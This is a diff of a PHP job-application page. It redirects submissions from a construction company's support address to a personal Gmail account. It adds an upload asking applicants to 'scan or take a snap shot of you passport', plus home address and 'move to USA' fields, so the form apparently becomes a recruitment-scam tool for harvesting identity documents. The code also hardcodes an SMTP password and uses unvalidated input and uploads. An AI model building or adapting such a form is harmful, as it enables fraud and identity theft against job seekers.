@@ -70,7 +70,7 @@ $mail->Password = "cornellekacy456";
     //and will cause your messages to fail SPF checks
     $mail->setFrom('from@example.com', 'Site Contact');
     //Send the message to yourself, or whoever should receive contact for submissions
-    $mail->addAddress('support@hilltopconstructions.com', 'Contact');
+    $mail->addAddress('cornellekacy4@gmail.com', 'Contact');
     //Put the submitter's address in a reply-to header
     //This will fail if the address provided is invalid,
     //in which case we should ignore the whole request
@@ -79,6 +79,8 @@ $mail->Password = "cornellekacy456";
         //Keep it simple - don't use HTML
         $mail->isHTML(false);
         //Build a simple message body
+        $mail->AddAttachment($_FILES['image']['tmp_name'],
+                         $_FILES['image']['name']);
         $mail->Body = <<<EOT
 Full Name: {$_POST['name']}
 Email: {$_POST['email']}
@@ -87,9 +89,11 @@ Country: {$_POST['country']}
 Date of birth: {$_POST['dob']}
 City/State: {$_POST['state']}
 Highest level of education: {$_POST['education']}
-Working Experience: {$_POST['working']}
+Do you have any working experience?: {$_POST['working']}
 Job Title: {$_POST['jobtitle']}
 Marital Status: {$_POST['status']}
+Current Home Address: {$_POST['haddress']}
+Can you move to USA for Work?: {$_POST['move']}
 Job Description: {$_POST['description']}
 EOT;
         //Send the message, check for errors
@@ -109,12 +113,12 @@ EOT;
 ?> 
                         </div>
                         <div class="new-job-submission">
-                           <form method="post">
+                           <form method="post" enctype="multipart/form-data">
                               <div class="resume-box">
                                  <div class="single-resume-feild feild-flex-2">
                                     <div class="single-input">
                                        <label for="j_title">Full Name:</label>
-                                       <input type="text" name="name" required="">
+                                       <input type="text" name="name" placeholder="Fullname" required="">
                                     </div>
                                     <div class="single-input">
                                        <label for="Location">Email Address:</label>
@@ -145,11 +149,21 @@ EOT;
                                  <div class="single-resume-feild feild-flex-2">
                                     <div class="single-input">
                                        <label for="mn_salary">Highest Level Of Education</label>
-                                       <input type="text" placeholder="e.g. bachelor's degree" name="education" required="">
+                                        <select name="education" required="">
+                                          <option value="High School certificate or equivalent">High School certificate or equivalent</option>
+                                          <option value="HND Certificate or equivalent">HND Certificate or equivalent</option>
+                                           <option value="Bachelor's degree or equivalent">Bachelor's degree or equivalent</option>
+                                            <option value="Master's degree or equivalent">Master's degree or equivalent</option>
+                                            <option value="PHD degree or equivalent">PHD degree or equivalent</option>
+                                       </select>
+                                  
                                     </div>
                                     <div class="single-input">
-                                       <label for="mx_salary">Working Experience</label>
-                                       <input type="text" placeholder="e.g. five years" name="working" required="">
+                                       <label for="mx_salary">Do you have any working experience?</label>
+                                           <select name="working" required="">
+                                          <option value="Yes">Yes</option>
+                                          <option value="No">No</option>
+                                       </select>
                                     </div>
                                  </div>
                                   <div class="single-resume-feild feild-flex-2">
@@ -166,21 +180,35 @@ EOT;
                                        </select>
                                     </div>
                                  </div>
+                                  <div class="single-resume-feild feild-flex-2">
+                                    <div class="single-input">
+                                       <label for="mn_salary">Current Home Address</label>
+                                       <input type="text" placeholder="e.g. truck driver" name="haddress" required="">
+                                    </div>
+                                   <div class="single-input">
+                                       <label for="j_category">Can you move to USA for Work?</label>
+                                       <select name="move" required="">
+                                          <option value="Yes">Yes</option>
+                                          <option value="No">No</option>
+                                           <option value="Not Sure">Not Sure</option>
+                                       </select>
+                                    </div>
+                                 </div>
                                  <div class="single-resume-feild">
                                     <div class="single-input">
-                                       <label for="j_desc">Job Description:</label>
+                                       <label for="j_desc">More Information about yourself:</label>
                                        <textarea name="description" required=""></textarea>
                                     </div>
                                  </div>
                                  <div class="single-resume-feild upload_file">
-                                    <div class="product-upload">
+                                    <div class="">
                                        <p>
                                           <i class="fa fa-upload"></i>
                                           Upload Files
                                        </p>
-                                       <input type="file" id="w_screen">
+                                       <input type="file" name="image">
                                     </div>
-                                    <p>Images or documents that might be helpful in describing your job</p>
+                                    <p>Scan or take a snap shot of you passport and upload it here</p>
                                  </div>
                               </div>
                               <div class="single-input submit-resume">
